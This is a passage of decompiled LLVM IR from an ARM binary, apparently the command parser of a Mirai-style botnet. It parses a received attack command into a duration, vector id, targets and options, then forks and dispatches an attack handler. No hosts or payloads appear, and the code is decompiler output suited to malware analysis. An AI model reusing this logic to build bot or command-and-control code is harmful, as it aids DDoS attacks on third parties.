  br i1 %v9_82c4, label %dec_label_pc_82ec, label %dec_label_pc_82d0

dec_label_pc_82d0:                                ; preds = %dec_label_pc_82d0.preheader, %dec_label_pc_82c0
  %v0_82c8.in = phi i32 [ %v0_82a8, %dec_label_pc_82d0.preheader ], [ %v0_82c8, %dec_label_pc_82c0 ]
  %v0_82d0 = phi i32 [ 0, %dec_label_pc_82d0.preheader ], [ %v1_82d0, %dec_label_pc_82c0 ]
  %v0_82c8 = add i32 %v0_82c8.in, 8
  %v1_82d0 = add i32 %v0_82d0, 1
  %v9_82d4 = icmp eq i32 %v1_82d0, %arg1
  store i32 %v0_82c8, i32* %r1.global-to-local, align 4
  br i1 %v9_82d4, label %dec_label_pc_82e0, label %dec_label_pc_82c0

dec_label_pc_82e0:                                ; preds = %dec_label_pc_82d0, %dec_label_pc_82ec, %entry, %dec_label_pc_82f8
  %v2_82e4 = phi i32 [ %v3_829c, %dec_label_pc_82ec ], [ %v3_829c, %entry ], [ %v2_82e4.pre, %dec_label_pc_82f8 ], [ %v3_829c, %dec_label_pc_82d0 ]
  %v0_82e0 = phi i32 [ %arg4, %dec_label_pc_82ec ], [ %arg4, %entry ], [ %v3_82fc, %dec_label_pc_82f8 ], [ %arg4, %dec_label_pc_82d0 ]
  store i32 %v2_82e4, i32* @r4, align 4
  store i32 %v6_829c, i32* @lr, align 4
  ret i32 %v0_82e0

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82c0, %dec_label_pc_82a8
  %v0_82ec = phi i32 [ %v0_82a8, %dec_label_pc_82a8 ], [ %v0_82c8, %dec_label_pc_82c0 ]
  %v1_82ec = inttoptr i32 %v0_82ec to i32*
  %v2_82ec = load i32, i32* %v1_82ec, align 4
  %v2_82f0 = icmp eq i32 %v2_82ec, 0
  br i1 %v2_82f0, label %dec_label_pc_82e0, label %dec_label_pc_82f8

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_82fc = inttoptr i32 %v2_82ec to i8*
  %v3_82fc = call i32 @util_atoi(i8* %v2_82fc, i32 10)
  %v2_82e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_82e0

; uselistorder directives
  uselistorder i32 %v1_82d0, { 1, 0 }
  uselistorder i32 %v0_82c8, { 1, 0, 2 }
  uselistorder i32 %v0_82c8.in, { 1, 0 }
  uselistorder i32 %v0_82a8, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_82e0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_82d0, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8308 = load i32, i32* @r5, align 4
  %v9_8308 = load i32, i32* @r6, align 4
  %v12_8308 = load i32, i32* @r7, align 4
  %v18_8308 = load i32, i32* @sb, align 4
  %v21_8308 = load i32, i32* @sl, align 4
  %v24_8308 = load i32, i32* @fp, align 4
  %v2_830c = icmp ugt i32 %arg2, 2
  %v7_830c = icmp eq i32 %arg2, 3
  store i1 %v7_830c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8318 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8318, i32* @r5, align 4
  %v2_831c = xor i1 %v7_830c, true
  %v3_831c = and i1 %v2_830c, %v2_831c
  br i1 %v3_831c, label %dec_label_pc_832c, label %dec_label_pc_8320

dec_label_pc_8320:                                ; preds = %dec_label_pc_8370, %.dec_label_pc_8320_crit_edge, %dec_label_pc_8364, %dec_label_pc_8354, %dec_label_pc_832c, %entry, %dec_label_pc_8518
  %v1_8328 = phi i32 [ %v1_8328.pre, %.dec_label_pc_8320_crit_edge ], [ %v1_8330, %dec_label_pc_8370 ], [ %v1_8330, %dec_label_pc_8364 ], [ %v1_8330, %dec_label_pc_8354 ], [ %v1_8330, %dec_label_pc_832c ], [ %v0_8318, %entry ], [ %v0_851c, %dec_label_pc_8518 ]
  store i32 %v6_8308, i32* @r5, align 4
  store i32 %v9_8308, i32* @r6, align 4
  store i32 %v12_8308, i32* @r7, align 4
  store i32 %v18_8308, i32* @sb, align 4
  store i32 %v21_8308, i32* @sl, align 4
  store i32 %v24_8308, i32* @fp, align 4
  ret i32 %v1_8328

dec_label_pc_832c:                                ; preds = %entry
  %v1_832c = inttoptr i32 %v0_8318 to i32*
  %v2_832c = load i32, i32* %v1_832c, align 4
  %v1_8330 = and i32 %v2_832c, 16711680
  store i32 %v1_8330, i32* %r0.global-to-local, align 4
  %v3_8334 = udiv i32 %v2_832c, 16777216
  %v1_8338 = and i32 %v2_832c, 65280
  %v4_833c = udiv i32 %v1_8330, 256
  %v5_833c = or i32 %v4_833c, %v3_8334
  %v4_8340 = mul nuw nsw i32 %v1_8338, 256
  %v5_8340 = or i32 %v5_833c, %v4_8340
  store i32 %v5_8340, i32* %r3.global-to-local, align 4
  %v5_8344 = call i32 @llvm.bswap.i32(i32 %v2_832c)
  store i32 %v5_8344, i32* %r1.global-to-local, align 4
  %v7_8348 = icmp eq i32 %arg2, 4
  store i1 %v7_8348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8348, label %dec_label_pc_8320, label %dec_label_pc_8354

dec_label_pc_8354:                                ; preds = %dec_label_pc_832c
  %v1_8354 = add i32 %v0_8318, 4
  %v2_8354 = inttoptr i32 %v1_8354 to i8*
  %v3_8354 = load i8, i8* %v2_8354, align 1
  %v4_8354 = zext i8 %v3_8354 to i32
  store i32 %v4_8354, i32* %r3.global-to-local, align 4
  %v7_8358 = icmp eq i32 %arg2, 5
  store i1 %v7_8358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8358, label %dec_label_pc_8320, label %dec_label_pc_8364

dec_label_pc_8364:                                ; preds = %dec_label_pc_8354
  %v1_8364 = add i32 %v0_8318, 5
  %v2_8364 = inttoptr i32 %v1_8364 to i8*
  %v3_8364 = load i8, i8* %v2_8364, align 1
  %v4_8364 = zext i8 %v3_8364 to i32
  store i32 %v4_8364, i32* @sb, align 4
  %v2_8368 = icmp eq i8 %v3_8364, 0
  store i1 %v2_8368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8368, label %dec_label_pc_8320, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_8364
  %v2_8374 = mul nuw nsw i32 %v4_8364, 5
  store i32 %v2_8374, i32* @r7, align 4
  %v1_8378 = add i32 %arg2, -6
  store i32 %v1_8378, i32* %r3.global-to-local, align 4
  %v3_837c = icmp ult i32 %v1_8378, %v2_8374
  %v9_837c = icmp eq i32 %v1_8378, %v2_8374
  store i1 %v9_837c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_837c, label %dec_label_pc_8320, label %dec_label_pc_8384

dec_label_pc_8384:                                ; preds = %dec_label_pc_8370
  store i32 %v4_8364, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8378, i32* @r6, align 4
  %v2_8390 = call i32 @calloc(i32 %v4_8364, i32 24)
  store i32 %v2_8390, i32* %ip.global-to-local, align 4
  %v0_839c = load i32, i32* @r7, align 4
  %v1_839c = load i32, i32* @r4, align 4
  %v2_839c = sub i32 %v1_839c, %v0_839c
  store i32 %v2_839c, i32* @r7, align 4
  %v0_83a0 = load i32, i32* @r5, align 4
  %v1_83a0 = add i32 %v0_83a0, 11
  store i32 %v1_83a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83a4

dec_label_pc_83a4:                                ; preds = %dec_label_pc_83a4, %dec_label_pc_8384
  %v1_83a8 = phi i32 [ %v1_83d4, %dec_label_pc_83a4 ], [ %v2_8390, %dec_label_pc_8384 ]
  %v0_83a4 = phi i32 [ %v1_83d0, %dec_label_pc_83a4 ], [ %v1_83a0, %dec_label_pc_8384 ]
  %v1_83a4 = add i32 %v0_83a4, -5
  %v2_83a4 = inttoptr i32 %v1_83a4 to i32*
  %v3_83a4 = load i32, i32* %v2_83a4, align 4
  store i32 %v3_83a4, i32* %r1.global-to-local, align 4
  %v2_83a8 = add i32 %v1_83a8, 16
  %v3_83a8 = inttoptr i32 %v2_83a8 to i32*
  store i32 %v3_83a4, i32* %v3_83a8, align 4
  %v0_83ac = load i32, i32* @r6, align 4
  %v1_83ac = add i32 %v0_83ac, -5
  store i32 %v1_83ac, i32* @r6, align 4
  %v0_83b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83b0 = add i32 %v0_83b0, -1
  %v2_83b0 = inttoptr i32 %v1_83b0 to i8*
  %v3_83b0 = load i8, i8* %v2_83b0, align 1
  %v0_83b4 = load i32, i32* @r7, align 4
  %v1_83b4 = add i32 %v0_83b4, -6
  store i32 %v1_83b4, i32* %r3.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  %v9_83bc = icmp eq i32 %v1_83ac, %v1_83b4
  store i1 %v9_83bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_83b0, i32* @r4, align 4
  %v2_83c4 = load i32, i32* %ip.global-to-local, align 4
  %v3_83c4 = add i32 %v2_83c4, 20
  %v4_83c4 = inttoptr i32 %v3_83c4 to i8*
  store i8 %v3_83b0, i8* %v4_83c4, align 1
  %v0_83c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_83c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_83c8 = add i32 %v1_83c8, 4
  %v3_83c8 = inttoptr i32 %v2_83c8 to i32*
  store i32 %v0_83c8, i32* %v3_83c8, align 4
  %v0_83cc = load i32, i32* @lr, align 4
  %v1_83cc = trunc i32 %v0_83cc to i16
  %v2_83cc = load i32, i32* %ip.global-to-local, align 4
  %v3_83cc = inttoptr i32 %v2_83cc to i16*
  store i16 %v1_83cc, i16* %v3_83cc, align 2
  %v0_83d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_83d0 = add i32 %v0_83d0, 5
  store i32 %v1_83d0, i32* %r0.global-to-local, align 4
  %v0_83d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_83d4 = add i32 %v0_83d4, 24
  store i32 %v1_83d4, i32* %ip.global-to-local, align 4
  %v0_83d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83d8, label %dec_label_pc_83dc, label %dec_label_pc_83a4

dec_label_pc_83dc:                                ; preds = %dec_label_pc_83a4
  %v0_83dc = load i32, i32* @r6, align 4
  %v2_83dc = icmp eq i32 %v0_83dc, 0
  store i1 %v2_83dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83dc, label %dec_label_pc_84dc, label %dec_label_pc_83e4

dec_label_pc_83e4:                                ; preds = %dec_label_pc_83dc
  %v0_83e4 = load i32, i32* @r4, align 4
  %v1_83e4 = inttoptr i32 %v0_83e4 to i8*
  %v2_83e4 = load i8, i8* %v1_83e4, align 1
  %v3_83e4 = zext i8 %v2_83e4 to i32
  store i32 %v3_83e4, i32* @r5, align 4
  %v2_83e8 = icmp eq i8 %v2_83e4, 0
  store i1 %v2_83e8, i1* %cpsr_z.global-to-local, align 1
  %v0_83ec = load i32, i32* @r7, align 4
  %v1_83ec = add i32 %v0_83ec, -7
  store i32 %v1_83ec, i32* @r8, align 4
  br i1 %v2_83e8, label %bb, label %dec_label_pc_83f8

bb:                                               ; preds = %dec_label_pc_83e4
  store i32 %v3_83e4, i32* @r6, align 4
  br label %dec_label_pc_84ac

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83e4
  store i32 %v3_83e4, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_8400 = call i32 @calloc(i32 %v3_83e4, i32 8)
  store i32 %v2_8400, i32* %r0.global-to-local, align 4
  %v0_8404 = load i32, i32* @r8, align 4
  %v2_8404 = icmp eq i32 %v0_8404, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8400, i32* @r6, align 4
  br i1 %v2_8404, label %dec_label_pc_84dc, label %dec_label_pc_8410

dec_label_pc_8410:                                ; preds = %dec_label_pc_83f8
  %v0_8410 = load i32, i32* @r4, align 4
  %v1_8410 = add i32 %v0_8410, 1
  %v2_8410 = inttoptr i32 %v1_8410 to i8*
  %v3_8410 = load i8, i8* %v2_8410, align 1
  %v0_8414 = load i32, i32* @r7, align 4
  %v7_8414 = icmp eq i32 %v0_8414, 8
  store i1 %v7_8414, i1* %cpsr_z.global-to-local, align 1
  %v3_8418 = add i32 %v2_8400, 4
  %v4_8418 = inttoptr i32 %v3_8418 to i8*
  store i8 %v3_8410, i8* %v4_8418, align 1
  %v0_841c = load i32, i32* @r4, align 4
  %v1_841c = add i32 %v0_841c, 1
  store i32 %v1_841c, i32* %r3.global-to-local, align 4
  %v0_8420 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8420, label %dec_label_pc_84dc, label %dec_label_pc_8424

dec_label_pc_8424:                                ; preds = %dec_label_pc_8410
  %v1_8424 = add i32 %v0_841c, 2
  %v2_8424 = inttoptr i32 %v1_8424 to i8*
  %v3_8424 = load i8, i8* %v2_8424, align 1
  %v4_8424 = zext i8 %v3_8424 to i32
  store i32 %v4_8424, i32* @r4, align 4
  %v0_8428 = load i32, i32* @r7, align 4
  %v1_8428 = add i32 %v0_8428, -9
  store i32 %v1_8428, i32* @r7, align 4
  %v9_842c = icmp eq i32 %v1_8428, %v4_8424
  store i1 %v9_842c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8424, i32* %r1.global-to-local, align 4
  %v5_8434 = icmp slt i32 %v1_8428, %v4_8424
  br i1 %v5_8434, label %dec_label_pc_84dc, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_8424
  %v7_84344711 = add i32 %v0_841c, 3
  store i32 %v7_84344711, i32* @r8, align 4
  %v6_8438812 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8438812, i32* @sl, align 4
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_8484

dec_label_pc_8448:                                ; preds = %dec_label_pc_8484
  %v0_8448 = load i32, i32* @r7, align 4
  %v1_8448 = load i32, i32* @r4, align 4
  %v2_8448 = sub i32 %v0_8448, %v1_8448
  store i32 %v2_8448, i32* %r1.global-to-local, align 4
  %v9_8448 = icmp eq i32 %v0_8448, %v1_8448
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8448, label %dec_label_pc_84dc, label %dec_label_pc_8450

dec_label_pc_8450:                                ; preds = %dec_label_pc_8448
  %v3_8450 = mul i32 %v0_84a4, 8
  store i32 %v3_8450, i32* %r3.global-to-local, align 4
  %v1_8454 = load i32, i32* @r8, align 4
  %v2_8454 = add i32 %v1_8454, %v1_8448
  %v3_8454 = inttoptr i32 %v2_8454 to i8*
  %v4_8454 = load i8, i8* %v3_8454, align 1
  %v0_8458 = load i32, i32* @r6, align 4
  %v2_8458 = add i32 %v0_8458, %v3_8450
  store i32 %v2_8458, i32* @sl, align 4
  %v1_845c = add i32 %v2_8448, -1
  store i32 %v1_845c, i32* %r3.global-to-local, align 4
  %v7_845c = icmp eq i32 %v2_8448, 1
  store i1 %v7_845c, i1* %cpsr_z.global-to-local, align 1
  %v3_8460 = add i32 %v2_8458, 4
  %v4_8460 = inttoptr i32 %v3_8460 to i8*
  store i8 %v4_8454, i8* %v4_8460, align 1
  %v0_8464 = load i32, i32* @r4, align 4
  %v1_8464 = load i32, i32* @r8, align 4
  %v2_8464 = add i32 %v1_8464, %v0_8464
  store i32 %v2_8464, i32* %r1.global-to-local, align 4
  %v0_8468 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8468, label %dec_label_pc_84dc, label %dec_label_pc_846c

dec_label_pc_846c:                                ; preds = %dec_label_pc_8450
  %v1_846c = add i32 %v2_8464, 1
  %v2_846c = inttoptr i32 %v1_846c to i8*
  %v3_846c = load i8, i8* %v2_846c, align 1
  %v4_846c = zext i8 %v3_846c to i32
  store i32 %v4_846c, i32* @r4, align 4
  %v0_8470 = load i32, i32* %r3.global-to-local, align 4
  %v1_8470 = add i32 %v0_8470, -1
  store i32 %v1_8470, i32* @r7, align 4
  %v2_8474 = sub i32 %v1_8470, %v4_846c
  %tmp47 = sub i32 0, %v2_8474
  %v6_8474 = and i32 %v1_8470, %tmp47
  %v7_8474 = icmp slt i32 %v6_8474, 0
  %v8_8474 = icmp slt i32 %v2_8474, 0
  %v9_8474 = icmp eq i32 %v1_8470, %v4_846c
  store i1 %v9_8474, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_846c, i32* %r1.global-to-local, align 4
  %v2_847c = xor i1 %v8_8474, %v7_8474
  br i1 %v2_847c, label %dec_label_pc_84dc, label %dec_label_pc_8480

dec_label_pc_8480:                                ; preds = %dec_label_pc_846c
  %v1_8480 = add i32 %v2_8464, 2
  store i32 %v1_8480, i32* @r8, align 4
  br label %dec_label_pc_8484

dec_label_pc_8484:                                ; preds = %.thread10, %dec_label_pc_8480
  %v0_8488 = phi i32 [ %v4_8424, %.thread10 ], [ %v4_846c, %dec_label_pc_8480 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_8488 = add nuw nsw i32 %v0_8488, 1
  store i32 %v2_8488, i32* %r0.global-to-local, align 4
  %v2_848c = call i32 @calloc(i32 %v2_8488, i32 1)
  store i32 %v2_848c, i32* %r0.global-to-local, align 4
  %v0_8490 = load i32, i32* @fp, align 4
  %v1_8490 = add i32 %v0_8490, 1
  store i32 %v1_8490, i32* @fp, align 4
  %v1_8494 = load i32, i32* @sl, align 4
  %v2_8494 = inttoptr i32 %v1_8494 to i32*
  store i32 %v2_848c, i32* %v2_8494, align 4
  %v0_8498 = load i32, i32* @r8, align 4
  store i32 %v0_8498, i32* %r1.global-to-local, align 4
  %v0_849c = load i32, i32* @r4, align 4
  %v3_84a0 = call i32 @util_memcpy(i32 %v2_848c, i32 %v0_8498, i32 %v0_849c)
  store i32 %v3_84a0, i32* %r0.global-to-local, align 4
  %v0_84a4 = load i32, i32* @fp, align 4
  %v1_84a4 = load i32, i32* @r5, align 4
  %v9_84a4 = icmp eq i32 %v0_84a4, %v1_84a4
  store i1 %v9_84a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_84a4, label %dec_label_pc_84ac, label %dec_label_pc_8448

dec_label_pc_84ac:                                ; preds = %dec_label_pc_8484, %bb
  %v0_84ac = call i32 @__GI___errno_location()
  store i32 %v0_84ac, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_84b4 = inttoptr i32 %v0_84ac to i32*
  store i32 0, i32* %v2_84b4, align 4
  %v0_84b8 = call i32 @__libc_fork()
  store i32 %v0_84b8, i32* %r0.global-to-local, align 4
  %v7_84bc = icmp eq i32 %v0_84b8, -1
  %. = zext i1 %v7_84bc to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_84c8 = icmp eq i32 %v0_84b8, 0
  store i1 %v2_84c8, i1* %cpsr_z.global-to-local, align 1
  %tmp50 = icmp slt i32 %v0_84b8, 1
  br i1 %tmp50, label %bb51, label %.thread14

.thread14:                                        ; preds = %dec_label_pc_84ac
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_84dc

bb51:                                             ; preds = %dec_label_pc_84ac
  %v2_84d4 = icmp eq i1 %v7_84bc, false
  store i1 %v2_84d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84d4, label %dec_label_pc_8524, label %dec_label_pc_84dc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8448, %dec_label_pc_846c, %dec_label_pc_8450, %dec_label_pc_8424, %.thread14, %dec_label_pc_8410, %dec_label_pc_83f8, %dec_label_pc_83dc, %bb51
  store i32 %v2_8390, i32* %r3.global-to-local, align 4
  %v2_84e0 = icmp eq i32 %v2_8390, 0
  store i1 %v2_84e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84e0, label %bb53, label %bb52

bb52:                                             ; preds = %dec_label_pc_84dc
  store i32 %v2_8390, i32* %r0.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %dec_label_pc_84dc, %bb52
  store i32 34028, i32* @lr, align 4
  %v1_84e8 = xor i1 %v2_84e0, true
  call void @__pseudo_cond_branch(i1 %v1_84e8, i32 ptrtoint (i32* @global_var_11abc.29 to i32))
  %v0_84ec = load i32, i32* @r6, align 4
  %v2_84ec = icmp eq i32 %v0_84ec, 0
  store i1 %v2_84ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84ec, label %.dec_label_pc_8320_crit_edge, label %dec_label_pc_84f4

.dec_label_pc_8320_crit_edge:                     ; preds = %bb53
  %v1_8328.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8320

dec_label_pc_84f4:                                ; preds = %bb53
  %v0_84f4 = load i32, i32* @r5, align 4
  %v2_84f4 = icmp eq i32 %v0_84f4, 0
  store i1 %v2_84f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_84f4, label %dec_label_pc_8518, label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_84f4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_8500

dec_label_pc_8500:                                ; preds = %dec_label_pc_8500, %dec_label_pc_84fc
  %v1_8500 = phi i32 [ 0, %dec_label_pc_84fc ], [ %v1_850c, %dec_label_pc_8500 ]
  %v0_8500 = phi i32 [ %v0_84ec, %dec_label_pc_84fc ], [ %v0_8518.pre, %dec_label_pc_8500 ]
  %v4_8500 = mul i32 %v1_8500, 8
  %v5_8500 = add i32 %v4_8500, %v0_8500
  %v6_8500 = inttoptr i32 %v5_8500 to i32*
  %v7_8500 = load i32, i32* %v6_8500, align 4
  store i32 %v7_8500, i32* %r0.global-to-local, align 4
  %v2_8504 = icmp eq i32 %v7_8500, 0
  store i1 %v2_8504, i1* %cpsr_z.global-to-local, align 1
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8504, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_11abc.29 to i32))
  %v0_850c = load i32, i32* @r4, align 4
  %v1_850c = add i32 %v0_850c, 1
  store i32 %v1_850c, i32* @r4, align 4
  %v0_8510 = load i32, i32* @r5, align 4
  %v9_8510 = icmp eq i32 %v0_8510, %v1_850c
  store i1 %v9_8510, i1* %cpsr_z.global-to-local, align 1
  %v0_8518.pre = load i32, i32* @r6, align 4
  br i1 %v9_8510, label %dec_label_pc_8518, label %dec_label_pc_8500

dec_label_pc_8518:                                ; preds = %dec_label_pc_8500, %dec_label_pc_84f4
  %v0_8518 = phi i32 [ %v0_84ec, %dec_label_pc_84f4 ], [ %v0_8518.pre, %dec_label_pc_8500 ]
  store i32 %v0_8518, i32* @r0, align 4
  %v0_851c = call i32 @free()
  store i32 %v0_851c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8320

dec_label_pc_8524:                                ; preds = %bb51
  store i32 ptrtoint (i8** @global_var_20f10.31 to i32), i32* %r3.global-to-local, align 4
  %v2_8528 = load i8, i8* bitcast (i8** @global_var_20f10.31 to i8*), align 4
  %v3_8528 = zext i8 %v2_8528 to i32
  store i32 %v3_8528, i32* %r0.global-to-local, align 4
  %v2_852c = icmp eq i8 %v2_8528, 0
  store i1 %v2_852c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_852c, label %dec_label_pc_8590, label %dec_label_pc_8534

dec_label_pc_8534:                                ; preds = %dec_label_pc_8524
  store i32 ptrtoint (i32* @global_var_20f14.33 to i32), i32* %r3.global-to-local, align 4
  %v2_8538 = load i32, i32* @global_var_20f14.33, align 4
  store i32 %v2_8538, i32* %r1.global-to-local, align 4
  %v1_853c = inttoptr i32 %v2_8538 to i32*
  %v2_853c = load i32, i32* %v1_853c, align 4
  store i32 %v2_853c, i32* %ip.global-to-local, align 4
  %v1_8544 = add i32 %v2_853c, 4
  %v2_8544 = inttoptr i32 %v1_8544 to i8*
  %v3_8544 = load i8, i8* %v2_8544, align 1
  %v4_8544 = zext i8 %v3_8544 to i32
  store i32 %v4_8544, i32* %r3.global-to-local, align 4
  %v9_8548 = icmp eq i8 %v3_8544, %v3_8354
  store i1 %v9_8548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8548, label %dec_label_pc_8570, label %dec_label_pc_8550

dec_label_pc_8550:                                ; preds = %dec_label_pc_8534, %dec_label_pc_855c
  %v0_8550 = phi i32 [ %v1_8550, %dec_label_pc_855c ], [ 0, %dec_label_pc_8534 ]
  %v1_8550 = add i32 %v0_8550, 1
  %v9_8554 = icmp eq i32 %v1_8550, %v3_8528
  store i1 %v9_8554, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8554, label %dec_label_pc_8590, label %dec_label_pc_855c

dec_label_pc_855c:                                ; preds = %dec_label_pc_8550
  %v4_855c = mul i32 %v1_8550, 4
  %v5_855c = add i32 %v4_855c, %v2_8538
  %v6_855c = inttoptr i32 %v5_855c to i32*
  %v7_855c = load i32, i32* %v6_855c, align 4
  store i32 %v7_855c, i32* %ip.global-to-local, align 4
  %v1_8564 = add i32 %v7_855c, 4
  %v2_8564 = inttoptr i32 %v1_8564 to i8*
  %v3_8564 = load i8, i8* %v2_8564, align 1
  %v4_8564 = zext i8 %v3_8564 to i32
  store i32 %v4_8564, i32* %r3.global-to-local, align 4
  %v9_8568 = icmp eq i8 %v3_8564, %v3_8354
  store i1 %v9_8568, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8568, label %dec_label_pc_8570, label %dec_label_pc_8550

dec_label_pc_8570:                                ; preds = %dec_label_pc_855c, %dec_label_pc_8534
  %v0_8584 = phi i32 [ %v2_853c, %dec_label_pc_8534 ], [ %v7_855c, %dec_label_pc_855c ]
  store i32 %v5_8344, i32* %r0.global-to-local, align 4
  %v0_8578 = load i32, i32* @sb, align 4
  store i32 %v0_8578, i32* %r1.global-to-local, align 4
  %v0_8580 = load i32, i32* @r5, align 4
  store i32 %v0_8580, i32* %r3.global-to-local, align 4
  %v1_8584 = inttoptr i32 %v0_8584 to i32*
  %v2_8584 = load i32, i32* %v1_8584, align 4
  store i32 %v2_8584, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_8584)
  br label %dec_label_pc_8590

dec_label_pc_8590:                                ; preds = %dec_label_pc_8550, %dec_label_pc_8524, %dec_label_pc_8570
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8594 = call i32 @__GI_exit(i32 0)
  store i32 %v1_8594, i32* %r0.global-to-local, align 4
  %v0_8598 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8598, label %bb55, label %.thread17

bb55:                                             ; preds = %dec_label_pc_8590
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %dec_label_pc_8590, %bb55
  %v3_859c = phi i32 [ %v1_8594, %dec_label_pc_8590 ], [ 0, %bb55 ]
  ret i32 %v3_859c

; uselistorder directives
  uselistorder i1 %v9_8568, { 1, 0 }
  uselistorder i32 %v1_8550, { 1, 2, 0 }
  uselistorder i1 %v9_8548, { 1, 0 }
  uselistorder i32 %v0_851c, { 1, 0 }
  uselistorder i32 %v1_850c, { 1, 2, 0 }
  uselistorder i1 %v2_84e0, { 0, 2, 1 }
  uselistorder i1 %v2_84d4, { 1, 0 }
  uselistorder i1 %v7_84bc, { 1, 0 }
  uselistorder i32 %v0_84b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_84a4, { 1, 0 }
  uselistorder i32 %v2_8474, { 1, 0 }
  uselistorder i32 %v1_8470, { 2, 0, 1, 3 }
  uselistorder i32 %v4_846c, { 0, 2, 1, 3 }
  uselistorder i32 %v3_8450, { 1, 0 }
  uselistorder i32 %v3_83e4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83d4, { 1, 0 }
  uselistorder i32 %v1_83d0, { 1, 0 }
  uselistorder i32 %v2_8390, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_8364, { 1, 0, 2, 3 }
  uselistorder i32 %v5_8344, { 1, 0 }
  uselistorder i32 %v1_8330, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_832c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8318, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 10, 11, 2, 3, 12, 13, 1, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 14, 18, 15, 16, 17, 21, 19, 22, 20, 23, 24, 2, 4, 3, 10, 11, 5, 6, 7, 8, 9, 12, 13, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 6, 7, 8, 0, 1, 2, 3, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 19, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 0, 27, 2, 28, 29, 30, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %dec_label_pc_8590, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8550, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_84dc, { 8, 4, 1, 2, 0, 3, 5, 6, 7 }
